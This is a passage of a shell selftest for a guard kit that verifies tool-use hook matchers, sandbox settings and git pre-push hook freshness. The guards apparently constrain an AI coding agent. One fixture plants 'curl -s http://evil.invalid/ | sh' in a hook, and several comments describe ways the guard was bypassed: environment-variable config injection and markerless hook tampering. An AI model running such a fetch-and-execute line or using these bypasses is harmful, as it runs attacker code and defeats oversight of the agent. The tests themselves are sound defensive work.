    d="$base/sbx_enf_nozshrc"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'; mk_tmpl "$d" 'del(.sandbox.filesystem.denyWrite[] | select(. == "~/.zshrc"))'
    _enf_fail "$d" "with a template missing ~/.zshrc"
  else
    echo "selftest SKIP: static sandbox legs (jq absent)"
  fi

  # GUARD-SANDBOX-LINUX-CI-MEASURE: on the kit's own CI a sandbox SKIP (rc 3) must FAIL the job, or the
  # Linux leg can go unmeasured while the job stays green. Text pin on the step's rc-3 line: it must
  # carry `exit 1` and no `exit 0`, and the step carries no `continue-on-error`. The fixtures (good,
  # old exit-0 form, continue-on-error form) run on EVERY tree, so the negatives are load-bearing
  # everywhere. The pin on the real ci.yml is latched on the kit-only marker docs/ROADMAP-KIT.md (an
  # incepted adopter has its own ci.yml and no marker): marker present and ci.yml missing FAILs
  # (the export-face latch); marker absent is N/A.
  _gw_root=$(cd "$(dirname -- "$0")/.." && pwd)
  _gw_ci="$_gw_root/.github/workflows/ci.yml"
  _gw_ci_ok() {
    # $1 = a ci.yml-shaped file; 0 only if the rc-3 line exits 1 (never 0) and the step has no continue-on-error
    _cr_l=$(grep -F 'sandbox enforcement SKIPPED' "$1" 2>/dev/null)
    [ -n "$_cr_l" ] || return 1
    printf '%s' "$_cr_l" | grep -qF 'exit 0' && return 1
    printf '%s' "$_cr_l" | grep -qF 'exit 1' || return 1
    _cr_b=$(awk '/- name: Sandbox enforcement/ {f=1} f && /^      - name:/ && !/Sandbox enforcement/ {f=0} f {print}' "$1")
    [ -n "$_cr_b" ] || return 1
    printf '%s' "$_cr_b" | grep -qF 'continue-on-error' && return 1
    return 0
  }
  _gw_ci_fx() {  # $1 file, $2 the rc-3 exit, $3 an extra step line (may be empty)
    printf '%s\n' '      - name: Sandbox enforcement (fixture)' > "$1"
    [ -z "$3" ] || printf '%s\n' "$3" >> "$1"
    printf '%s\n' '        run: |' '          if [ "$rc" -eq 3 ]; then echo "::error::sandbox enforcement SKIPPED on CI"; '"$2"'; fi' '      - name: Next step' '        continue-on-error: true' >> "$1"
  }
  _gw_ci_fx "$base/ci_good.yml" 'exit 1' ''
  _gw_ci_fx "$base/ci_old.yml" 'exit 0' ''
  _gw_ci_fx "$base/ci_coe.yml" 'exit 1' '        continue-on-error: true'
  if _gw_ci_ok "$base/ci_good.yml"; then echo "selftest PASS: pin accepts the exit-1 rc-3 form (a later step's continue-on-error is out of scope)"; else echo "selftest FAIL: pin rejected the good fixture"; st=1; fi
  if _gw_ci_ok "$base/ci_old.yml"; then echo "selftest FAIL: the old exit-0 rc-3 form was accepted (pin is vacuous)"; st=1; else echo "selftest PASS: scratch ci.yml with the old exit-0 rc-3 form -> pin reds"; fi
  if _gw_ci_ok "$base/ci_coe.yml"; then echo "selftest FAIL: continue-on-error on the sandbox step was accepted (pin is vacuous)"; st=1; else echo "selftest PASS: scratch ci.yml with continue-on-error on the sandbox step -> pin reds"; fi
  if [ ! -f "$_gw_root/docs/ROADMAP-KIT.md" ]; then
    echo "selftest SKIP: ci.yml sandbox rc-3 pin on this tree (no kit marker: adopter, N/A)"
  elif [ ! -f "$_gw_ci" ]; then
    echo "selftest FAIL: kit tree has no .github/workflows/ci.yml, so the rc-3 pin cannot run (export-face latch)"; st=1
  elif _gw_ci_ok "$_gw_ci"; then echo "selftest PASS: ci.yml sandbox-enforcement step exits non-zero on rc 3 and has no continue-on-error (a SKIP fails the kit's CI)"
  else echo "selftest FAIL: ci.yml sandbox-enforcement step must exit non-zero on rc 3 (no exit 0, an exit 1) and carry no continue-on-error"; st=1
  fi

  d="$base/full"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
  if check_dir "$d" >/dev/null 2>&1; then echo "selftest PASS: full matcher -> wired"; else echo "selftest FAIL: full matcher should be wired"; st=1; fi

  d="$base/wild"; mk "$d" '.*'
  if check_dir "$d" >/dev/null 2>&1; then echo "selftest PASS: .* matcher -> wired"; else echo "selftest FAIL: .* matcher should be wired"; st=1; fi

  # the older brownfield snippet (named tools, no mcp__ branch) must FAIL — the MCP class is dark
  d="$base/nomcp"; mk "$d" 'Bash|Write|Edit|NotebookEdit'
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: no-mcp matcher -> FAIL (MCP class dark)"; else echo "selftest FAIL: no-mcp matcher should FAIL (got $rc)"; st=1; fi

  # a degenerate single-char matcher must FAIL (anchored full-match, not substring)
  d="$base/degenerate"; mk "$d" '.'
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: '.' matcher -> FAIL (anchored, not substring)"; else echo "selftest FAIL: '.' matcher should FAIL (got $rc)"; st=1; fi

  # an over-narrow mcp matcher (one server only) must FAIL — needs a true mcp__* wildcard
  d="$base/narrowmcp"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__github__.*'
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: narrow-mcp matcher -> FAIL (needs mcp__* wildcard)"; else echo "selftest FAIL: narrow-mcp should FAIL (got $rc)"; st=1; fi

  d="$base/dark"; mk "$d" 'Read'
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: Read-only matcher -> FAIL (dark)"; else echo "selftest FAIL: Read-only matcher should FAIL (got $rc)"; st=1; fi

  d="$base/partial"; mk "$d" 'Bash'
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: Bash-only matcher -> FAIL (Write/Edit dark)"; else echo "selftest FAIL: Bash-only matcher should FAIL (got $rc)"; st=1; fi

  d="$base/empty"; mkdir -p "$d"
  if check_dir "$d" >/dev/null 2>&1; then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ]; then echo "selftest PASS: no settings -> FAIL"; else echo "selftest FAIL: no settings should FAIL (got $rc)"; st=1; fi

  # ── B3 — the rung leg. mk_repo builds a FULL fixture (mk() above, satisfied so the pre-existing
  # legs' verdicts never mask the rung's own): a qualifying, git-initialized tree whose installed
  # pre-push hook is FRESH by default. Each leg below perturbs exactly one thing. Re-invoked as a
  # SUBPROCESS (sh "$0" <dir>), not a direct check_dir call, so CI/GITHUB_ACTIONS (and, from review
  # round 1, GIT_DIR) can be pinned per-leg (design D4) rather than inherited from whatever this
  # selftest happens to run under.
  mk_repo() {
    _d="$1"; _m="$2"; _opt="${3:-}"
    mk "$_d" "$_m"
    [ "$_opt" = nomarker ] || : > "$_d/ENGINEERING-PRINCIPLES.md"
    mkdir -p "$_d/hooks"
    printf '#!/bin/sh\n# KIT_GUARD_CORE\necho installed\n' > "$_d/hooks/pre-push"
    printf '#!/bin/sh\nexit 0\n' > "$_d/.claude/hooks/guard-core.sh"
    git init -q "$_d" >/dev/null
    # REV M1 + SEC L1 (review round 1, item 5): freshness now reads the TRACKED blob at HEAD, never
    # the working-tree file — so the fixture must actually COMMIT hooks/pre-push, or every
    # freshness leg below would hit the new tracked-missing verdict instead of its own (before this
    # fix, HEAD was unborn in every fixture: `git init` alone, never a commit).
    git -C "$_d" add -A >/dev/null
    git -C "$_d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m init >/dev/null
    _rh=$(git -C "$_d" rev-parse --git-path hooks/pre-push) || _rh=""
    case "$_rh" in /*) : ;; *) _rh="$_d/$_rh" ;; esac
    mkdir -p "$(dirname "$_rh")"
    cp "$_d/hooks/pre-push" "$_rh"
    chmod +x "$_rh"
    printf '%s\n' "$_rh"
  }
  MATCHER='Bash|Write|Edit|NotebookEdit|mcp__.*'

  # fresh-OK: qualifying + git + FRESH installed rung -> wired, FRESH asserted.
  d="$base/rung_fresh"; mk_repo "$d" "$MATCHER" >/dev/null
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'FRESH'; then
    echo "selftest PASS: rung fresh -> wired, FRESH asserted"
  else echo "selftest FAIL: rung fresh should be wired+FRESH (rc=$rc): $out"; st=1; fi

  # REV M4 + SEC L4 (review round 1, item 7): the OK summary discloses the foreign-hook lane too.
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'preserved foreign hook (uncertified)'; then
    echo "selftest PASS: OK summary discloses the foreign-hook lane"
  else echo "selftest FAIL: OK summary should disclose the foreign-hook lane (rc=$rc): $out"; st=1; fi

  # absent-RED: qualifying + git, nothing installed at the resolved hook path.
  d="$base/rung_absent"; rh=$(mk_repo "$d" "$MATCHER"); rm -f "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not installed at'; then
    echo "selftest PASS: rung absent -> FAIL (absent verdict)"
  else echo "selftest FAIL: rung absent should FAIL with an absent verdict (rc=$rc): $out"; st=1; fi

  # REV M2 (review round 1, item 6): only the rung leg failed here (the PreToolUse legs are fine) —
  # the summary must NAME the failed rung, never claim runtime protection is absent altogether.
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'guard-wired: FAIL — a guard rung is not wired'; then
    echo "selftest PASS: rung-only failure summary names the rung, not blanket 'unprotected'"
  else echo "selftest FAIL: rung-only failure summary should name the rung (rc=$rc): $out"; st=1; fi

  # stale-RED — the marker-vacuity kill: the stale copy still CARRIES the marker, so a marker-only
  # freshness test would wrongly call this OK; only a byte compare catches it (R2, design Δ3).
  d="$base/rung_stale"; rh=$(mk_repo "$d" "$MATCHER")
  printf '#!/bin/sh\n# KIT_GUARD_CORE\necho installedX\n' > "$rh"; chmod +x "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
    echo "selftest PASS: rung stale (marker present, one byte differs) -> FAIL (STALE verdict)"
  else echo "selftest FAIL: rung stale should FAIL with a STALE verdict (rc=$rc): $out"; st=1; fi

  # GIT_DIR-reroute-immune (review round 1, item 1, SEC HIGH-1): re-invoke against the STALE fixture
  # above with an AMBIENT GIT_DIR pointing at the FRESH fixture's .git (shape of the CI=1 leg) — the
  # STALE verdict must still fire. Pre-fix, this silently rebased every git call in the leg onto the
  # FRESH fixture's git-path/config and printed FRESH instead (measured on a scratchpad copy of the
  # pre-fix file; see the build's own verification report for the before/after transcript).
  if out=$(CI='' GITHUB_ACTIONS='' GIT_DIR="$base/rung_fresh/.git" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
    echo "selftest PASS: rung stale under a foreign GIT_DIR -> STALE verdict still fires (env-reroute immune)"
  else echo "selftest FAIL: rung stale under a foreign GIT_DIR should still STALE (rc=$rc): $out"; st=1; fi

  # GIT_CONFIG-injection-immune (B3 r3 MED-A): SAME shape as the GIT_DIR leg just above, but the
  # injection vector is the config-override family instead of the repo-resolution family — an
  # ambient GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=<nowhere>
  # injects a fake core.hooksPath into every `git config --get` this leg runs. Pre-fix this muted
  # the genuinely-STALE fixture into the disclosed "core.hooksPath redirects hooks to ..." N/A
  # instead of the STALE verdict — the STALE verdict must still fire.
  if out=$(CI='' GITHUB_ACTIONS='' GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/tmp/nowhere sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
    echo "selftest PASS: rung stale under an injected GIT_CONFIG_COUNT hooksPath -> STALE verdict still fires (config-injection immune)"
  else echo "selftest FAIL: rung stale under an injected GIT_CONFIG_COUNT hooksPath should still STALE (rc=$rc): $out"; st=1; fi

  # GIT_CONFIG_PARAMETERS-injection-immune (B3 r4): SIBLING of the GIT_CONFIG_COUNT leg just above —
  # same fake-core.hooksPath injection, but via the GIT_CONFIG_PARAMETERS single-var encoding git
  # itself uses to pass `-c` overrides through a subprocess boundary, not the GIT_CONFIG_COUNT/KEY_n/
  # VALUE_n triad. Pre-fix (rc 0 on this stale fixture, measured) this vector was NOT in _gw_git's
  # unset list at all, muting the leg to the disclosed N/A instead of the genuine STALE verdict —
  # the STALE verdict must still fire.
  if out=$(CI='' GITHUB_ACTIONS='' GIT_CONFIG_PARAMETERS="'core.hookspath'='/tmp/nowhere'" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'STALE'; then
    echo "selftest PASS: rung stale under an injected GIT_CONFIG_PARAMETERS hooksPath -> STALE verdict still fires (config-injection immune)"
  else echo "selftest FAIL: rung stale under an injected GIT_CONFIG_PARAMETERS hooksPath should still STALE (rc=$rc): $out"; st=1; fi

  # non-exec-RED: installed, matches, marked — but not executable; git silently ignores it.
  d="$base/rung_nonexec"; rh=$(mk_repo "$d" "$MATCHER"); chmod -x "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'NOT EXECUTABLE'; then
    echo "selftest PASS: rung non-executable -> FAIL"
  else echo "selftest FAIL: rung non-executable should FAIL (rc=$rc): $out"; st=1; fi

  # foreign-OK: installed + executable, but carries no KIT_GUARD_CORE marker — brownfield-safe.
  d="$base/rung_foreign"; rh=$(mk_repo "$d" "$MATCHER")
  printf '#!/bin/sh\necho legacy hook\n' > "$rh"; chmod +x "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'foreign hook preserved'; then
    echo "selftest PASS: rung foreign (no marker) -> wired, not judged"
  else echo "selftest FAIL: rung foreign should be wired and named foreign (rc=$rc): $out"; st=1; fi

  # dangling-symlink-RED: tested BEFORE absent — a cp-based remedy would write THROUGH the link.
  d="$base/rung_dangling"; rh=$(mk_repo "$d" "$MATCHER"); rm -f "$rh"; ln -s /nonexistent/target "$rh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DANGLING SYMLINK'; then
    echo "selftest PASS: rung dangling symlink -> FAIL (rm remedy, not cp)"
  else echo "selftest FAIL: rung dangling symlink should FAIL (rc=$rc): $out"; st=1; fi

  # no-git-N/A: a qualifying tree with no .git at all -> N/A, never silent.
  d="$base/rung_nogit"; mk "$d" "$MATCHER"; : > "$d/ENGINEERING-PRINCIPLES.md"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'not a git work tree'; then
    echo "selftest PASS: rung no-git -> N/A (disclosed)"
  else echo "selftest FAIL: rung no-git should N/A with a disclosed message (rc=$rc): $out"; st=1; fi

  # CI-set-N/A (disclosed): a fresh, qualifying, git tree — but CI=1 mutes the leg (the disclosed hole).
  d="$base/rung_ci"; mk_repo "$d" "$MATCHER" >/dev/null
  if out=$(CI=1 sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'CI/GITHUB_ACTIONS is set'; then
    echo "selftest PASS: rung under CI=1 -> N/A (disclosed hole stated)"
  else echo "selftest FAIL: rung under CI=1 should N/A with the disclosed-hole message (rc=$rc): $out"; st=1; fi

  # unqualifying-tree-N/A: a fresh, installed, git tree carrying NEITHER marker -> N/A (the pristine
  # export-tree / un-incepted kit-source shape; --kitself is the WRONG key per design Δ2 polarity note).
  d="$base/rung_unqualified"; mk_repo "$d" "$MATCHER" nomarker >/dev/null
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'nothing to certify here'; then
    echo "selftest PASS: rung on an unqualifying tree -> N/A"
  else echo "selftest FAIL: rung on an unqualifying tree should N/A (rc=$rc): $out"; st=1; fi

  # core-missing-RED: fresh + marked + byte-matching, but the D3 core target is absent — not core-resolvable.
  d="$base/rung_coremissing"; mk_repo "$d" "$MATCHER" >/dev/null; rm -f "$d/.claude/hooks/guard-core.sh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not core-resolvable'; then
    echo "selftest PASS: rung fresh but core-missing -> FAIL (not core-resolvable)"
  else echo "selftest FAIL: rung with a missing core target should FAIL (rc=$rc): $out"; st=1; fi

  # tracked-missing-RED (review round 1, item 5): hooks/pre-push was on disk when installed but was
  # never (or no longer) committed to HEAD — the freshness SOURCE is HEAD, not the working tree, so
  # this must red with its OWN verdict, never the STALE wording.
  d="$base/rung_trackedmissing"; mk_repo "$d" "$MATCHER" >/dev/null
  git -C "$d" rm --cached -q hooks/pre-push >/dev/null
  git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "drop tracked hook" >/dev/null
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'missing from HEAD'; then
    echo "selftest PASS: rung tracked-missing -> FAIL (its own verdict, not STALE)"
  else echo "selftest FAIL: rung tracked-missing should FAIL with its own verdict (rc=$rc): $out"; st=1; fi

  # no-commits-RED (B3): the SAME branch has a second cause — an UNBORN HEAD on a never-committed tree,
  # which is what an adopter hits first. Both directions asserted: the true cause NAMED and the harmful remedy ABSENT (a message saying both is still misleading).
  d="$base/rung_nocommits"; mk_repo "$d" "$MATCHER" >/dev/null; git -C "$d" update-ref -d HEAD >/dev/null 2>&1 || true
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'no commits yet' && ! printf '%s' "$out" | grep -q 'recopy'; then
    echo "selftest PASS: rung on a HEAD-less tree -> FAIL naming 'no commits yet', never 'recopy'"
  else echo "selftest FAIL: a HEAD-less tree must red with the no-commits cause and NO recopy advice (rc=$rc): $out"; st=1; fi

  # hooksPath-genuine-N/A (review round 1, item 8, SEC L2): core.hooksPath='.husky' on a MAIN
  # worktree is a genuine foreign redirect (nowhere near the default hooks dir) -> disclosed-skip
  # N/A, never judged — the case the linked+relative fall-through above must NOT swallow.
  d="$base/rung_hookspath"; mk_repo "$d" "$MATCHER" >/dev/null
  git -C "$d" config core.hooksPath .husky
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  # Δ2 FALSE-POSITIVE LOCK: this fixture is an ADOPTER tree (mk_repo stamps only the adopter marker),
  # so the SAME value that REDs as DISARMED on a kit-source tree below must still take D2's disclosed
  # skip here, verbatim — the kit does not judge a husky/lefthook adopter's own hooks dir.
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "core.hooksPath redirects hooks to '.husky'" && ! printf '%s' "$out" | grep -q 'DISARMED'; then
    echo "selftest PASS: rung hooksPath='.husky' (adopter main worktree) -> disclosed-skip N/A, never DISARMED"
  else echo "selftest FAIL: rung hooksPath='.husky' should disclosed-skip N/A (rc=$rc): $out"; st=1; fi

  # linked-worktree + RELATIVE core.hooksPath -> dangling redirect, named as the cause (review
  # round 1, item 2, REV H1). Also the missing TRUE linked-worktree fixture this family lacked. A
  # genuinely linked checkout (`git worktree add`), not `--separate-git-dir` (item 3 below keeps
  # THAT case on the full ladder).
  d="$base/rung_wt_main"; mk_repo "$d" "$MATCHER" >/dev/null
  wt="$base/rung_wt_linked"
  if git -C "$d" worktree add -q "$wt" -b rung-wt-branch >/dev/null 2>&1 && git -C "$wt" config core.hooksPath .git/hooks >/dev/null 2>&1; then
    if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not installed at' && printf '%s' "$out" | grep -q 'RELATIVE in a linked worktree'; then
      echo "selftest PASS: linked worktree + relative hooksPath -> FAIL naming the dangling redirect"
    else
      echo "selftest FAIL: linked worktree + relative hooksPath should FAIL naming the redirect (rc=$rc): $out"; st=1
    fi
  else
    echo "selftest FAIL: could not construct the linked-worktree + hooksPath fixture"; st=1
  fi

  # ── TRACKED-HOOKS MODE (HOOK-INSTALL-RECURS-PER-SLICE, Δ1/Δ2) ──────────────────────────────────
  # mk_tracked <dir>: an mk_repo fixture switched to TRACKED-HOOKS mode — the tracked hooks/pre-push
  # carries the exec bit IN THE INDEX (so a linked worktree checks it out executable), the redundant
  # INSTALLED copy is REMOVED (this mode's green must come from the tracked file alone, never from a
  # leftover .git/hooks copy), and core.hooksPath names the tree's own hooks dir. The config is set
  # INSIDE this script's own process — the agent's shell never utters that key, which the guard
  # human-gates (design §4, fixture mechanics).
  # <kind> (2nd arg): `foreign` commits a MARKERLESS hook as the tree's own tracked hook (the adopter
  # whose hooks/ is legitimately not the kit's); anything else keeps the kit-marked one.
  mk_tracked() {
    _td="$1"; mk_repo "$_td" "$MATCHER" >/dev/null
    [ "${2:-kit}" != foreign ] || printf '#!/bin/sh\necho legacy hook\n' > "$_td/hooks/pre-push"
    chmod +x "$_td/hooks/pre-push"
    git -C "$_td" add -A >/dev/null 2>&1 || true
    git -C "$_td" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "exec bit" >/dev/null 2>&1 || true
    rm -f "$_td/.git/hooks/pre-push"
    git -C "$_td" config core.hooksPath hooks
  }

  # tracked-mode PASS: core.hooksPath resolving to the tree's OWN tracked hooks/ dir is NOT a foreign
  # redirect — it is the kit's tracked-hooks mode, where hooks/pre-push IS the live hook and the
  # ladder's byte compare against HEAD becomes the worktree-vs-HEAD freshness.
  d="$base/rung_tracked_ok"; mk_tracked "$d"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode' && printf '%s' "$out" | grep -q 'worktree matches HEAD'; then
    echo "selftest PASS: tracked-hooks mode (clean, no installed copy) -> wired, mode named"
  else echo "selftest FAIL: tracked-hooks mode should PASS naming the mode (rc=$rc): $out"; st=1; fi

  # DIRTY-hook RED — this mode's redefined stale face and its load-bearing negative: the live hook is
  # the WORKING-TREE file, so a working-tree mutation is arbitrary code at push time that no PR diff
  # shows. It still carries the marker (marker-vacuity kill, as the installed mode's STALE leg), and
  # the remedy must be restore/commit — a `cp` remedy would be nonsense here.
  d="$base/rung_tracked_dirty"; mk_tracked "$d"
  printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && printf '%s' "$out" | grep -q 'git restore'; then
    echo "selftest PASS: tracked-hooks mode + dirty worktree hook -> FAIL (restore/commit remedy)"
  else echo "selftest FAIL: tracked-hooks dirty hook should FAIL with a restore/commit remedy (rc=$rc): $out"; st=1; fi

  # MARKERLESS-TAMPER RED (review round 1 BLOCKER, both seats; security measured the composed exploit
  # end to end). The marker test used to SHORT-CIRCUIT ahead of the byte compare, so a worktree hook
  # whose KIT_GUARD_CORE line was DELETED took the "foreign hook preserved" PASS — rc 0 on a live hook
  # whose body is arbitrary code. That is not a hypothetical shape: a cd-basename write produces exactly
  # a markerless file (GUARD-BASENAME-AFTER-CD-BYPASS now denies the single-command quote-free case in
  # real time; its persisted-cwd/$VAR residuals still produce this shape). In tracked mode the compare
  # must run FIRST: a tracked file that differs from HEAD is judged, marker or no marker. The payload
  # here is inert by construction (.invalid is RFC 2606 reserved) and shaped like the real thing.
  d="$base/rung_tracked_markerless"; mk_tracked "$d"
  printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && ! printf '%s' "$out" | grep -q 'foreign hook preserved'; then
    echo "selftest PASS: tracked-hooks mode + MARKERLESS tampered hook -> FAIL (compare precedes the marker test)"
  else echo "selftest FAIL: tracked-hooks markerless tamper must FAIL, never 'foreign preserved' (rc=$rc): $out"; st=1; fi

  # FALSE-POSITIVE LOCK for that fix, and the reason the cure is PRECEDENCE rather than a marker
  # requirement: an adopter whose OWN tracked hooks/pre-push carries no kit marker and is UNMODIFIED
  # still takes the foreign-preserve PASS. Judging by "no marker => FAIL" would punish that repo; the
  # compare-first order judges only what actually diverges from what the tree carries under review.
  d="$base/rung_tracked_foreign"; mk_tracked "$d" foreign
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'foreign hook preserved'; then
    echo "selftest PASS: tracked-hooks mode + markerless hook MATCHING HEAD -> foreign-preserve PASS (adopter unpunished)"
  else echo "selftest FAIL: an unmodified markerless tracked hook should be preserved, not judged (rc=$rc): $out"; st=1; fi

  # core-missing RED, TRACKED-MODE arm (review round 2 m3): the compare-first tail's core-resolvable
  # leg had no fixture. The live tracked hook MATCHES HEAD and carries the marker, but the D3 core
  # target is gone — mirror of installed mode's rung_coremissing, on the tracked ladder.
  d="$base/rung_tracked_coremissing"; mk_tracked "$d"; rm -f "$d/.claude/hooks/guard-core.sh"
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not core-resolvable'; then
    echo "selftest PASS: tracked-hooks mode, hook matches HEAD but core target missing -> FAIL (not core-resolvable)"
  else echo "selftest FAIL: tracked-hooks core-missing should FAIL not core-resolvable (rc=$rc): $out"; st=1; fi

  # HEAD-missing RED, TRACKED-MODE arm (review round 2 m3, the compare-first tail's :433 branch): the
  # live tracked hook exists but HEAD carries no hooks/pre-push blob (it was committed then unstaged),
  # so it cannot be compared against anything this tree carries. This is the state inception-done's
  # (b8) mirrors — both surfaces RED it when HEAD exists but the hook is not committed.
  d="$base/rung_tracked_headmissing"; mk_tracked "$d"
  git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
  git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "drop tracked hook" >/dev/null 2>&1
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'missing from HEAD'; then
    echo "selftest PASS: tracked-hooks mode, hook not committed at HEAD -> FAIL (missing from HEAD)"
  else echo "selftest FAIL: tracked-hooks HEAD-missing should FAIL missing from HEAD (rc=$rc): $out"; st=1; fi

  # Δ2 DISARM RED — a KIT-SOURCE tree whose hooksPath points at neither the tracked dir nor the
  # default has had its rung disarmed; on the kit's own repo that is a FAIL, not a disclosed skip.
  d="$base/rung_kit_disarm"; mk_repo "$d" "$MATCHER" >/dev/null
  mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
  git -C "$d" config core.hooksPath .husky
  if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED'; then
    echo "selftest PASS: kit-source tree + foreign hooksPath -> FAIL (rung DISARMED)"
  else echo "selftest FAIL: kit-source tree + foreign hooksPath should FAIL as DISARMED (rc=$rc): $out"; st=1; fi

  # Δ2 GLOBAL-config remedy: the same disarm, but the value is NOT in the repo's local config — it
  # comes from the maintainer's GLOBAL config (HOME is deliberately NOT stripped by _gw_git, since
  # git honors it at push time too, so this leg also LOCKS that deliberate non-stripping). A local
  # `--unset` would not cure it, so the remedy must name the global config.
  d="$base/rung_kit_globaldisarm"; mk_repo "$d" "$MATCHER" >/dev/null
  mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
  gh_home="$base/rung_kit_globalhome"; mkdir -p "$gh_home"
  printf '[core]\n\thooksPath = %s\n' "$base/nowhere-hooks" > "$gh_home/.gitconfig"
  if out=$(CI='' GITHUB_ACTIONS='' HOME="$gh_home" XDG_CONFIG_HOME="$gh_home/.config" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED' && printf '%s' "$out" | grep -q -- '--global'; then
    echo "selftest PASS: kit-source tree + GLOBAL hooksPath -> FAIL naming the global-config cure"
  else echo "selftest FAIL: kit-source + global hooksPath should FAIL naming the global cure (rc=$rc): $out"; st=1; fi

